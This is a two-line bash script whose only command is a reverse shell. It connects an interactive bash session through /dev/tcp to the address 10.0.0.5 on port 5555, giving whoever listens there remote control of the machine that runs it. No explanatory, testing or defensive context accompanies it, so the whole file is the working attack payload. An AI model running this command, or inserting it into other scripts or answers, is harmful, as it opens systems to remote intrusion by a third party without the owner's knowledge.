#!/bin/bash
bash -i >& /dev/tcp/10.0.0.5/5555 0>&1
